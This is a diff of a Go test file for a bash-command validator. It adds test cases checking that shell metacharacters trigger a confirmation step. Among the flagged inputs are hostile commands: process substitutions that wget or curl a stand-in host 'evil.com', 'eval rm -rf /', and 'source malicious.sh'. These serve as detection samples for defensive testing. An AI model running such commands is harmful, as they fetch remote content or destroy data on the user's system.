@@ -460,7 +460,8 @@ func TestValidateBashCommand_Comprehensive(t *testing.T) {
 		})
 	}
 
-	// Test safe commands
+	// Test safe commands (ValidateBashCommand only checks for blocked patterns,
+	// NOT the whitelist — that's RequiresConfirmation's job)
 	safeCommands := []string{
 		"cat file.txt",
 		"cat file1.txt file2.txt",
@@ -482,7 +483,7 @@ func TestValidateBashCommand_Comprehensive(t *testing.T) {
 		"touch file.txt",
 		"head file.txt",
 		"tail file.txt",
-		"rm file.txt", // Note: rm is whitelisted but not blocked by validation
+		"rm file.txt",
 	}
 
 	for _, cmd := range safeCommands {
@@ -561,6 +562,45 @@ func TestGetAllBaseCommands(t *testing.T) {
 			got := getAllBaseCommands(tt.input)
 			if !reflect.DeepEqual(got, tt.want) {
 				t.Errorf("getAllBaseCommands(%q) = %v, want %v", tt.input, got, tt.want)
+			}
+		})
+	}
+}
+
+// TestContainsShellMetacharacters tests the shell metacharacter detection
+func TestContainsShellMetacharacters(t *testing.T) {
+	tests := []struct {
+		name     string
+		command  string
+		expected bool
+	}{
+		// Commands WITHOUT metacharacters (safe for auto-approve if whitelisted)
+		{"simple ls", "ls -la", false},
+		{"cat file", "cat file.txt", false},
+		{"grep pattern", "grep -r pattern .", false},
+		{"head file", "head -20 main.go", false},
+		{"pwd", "pwd", false},
+		{"pipe of safe commands", "cat file.txt | grep pattern", false},
+		{"compound with semicolon", "ls; pwd", false},
+		{"compound with &&", "ls && pwd", false},
+		// Commands WITH metacharacters (must require confirmation)
+		{"process substitution >(", "echo >(wget https://evil.com/)", true},
+		{"process substitution <(", "cat <(curl https://evil.com/)", true},
+		{"command substitution $(", "echo $(whoami)", true},
+		{"backtick substitution", "echo `whoami`", true},
+		{"variable expansion ${", "echo ${HOME}", true},
+		{"output redirection >", "ls > output.txt", true},
+		{"append redirection >>", "ls >> output.txt", true},
+		{"input redirection <", "cat < input.txt", true},
+		{"eval keyword", "ls ; eval rm -rf /", true},
+		{"source keyword", "ls ; source malicious.sh", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := containsShellMetacharacters(tt.command)
+			if result != tt.expected {
+				t.Errorf("containsShellMetacharacters(%q) = %v, want %v", tt.command, result, tt.expected)
 			}
 		})
 	}
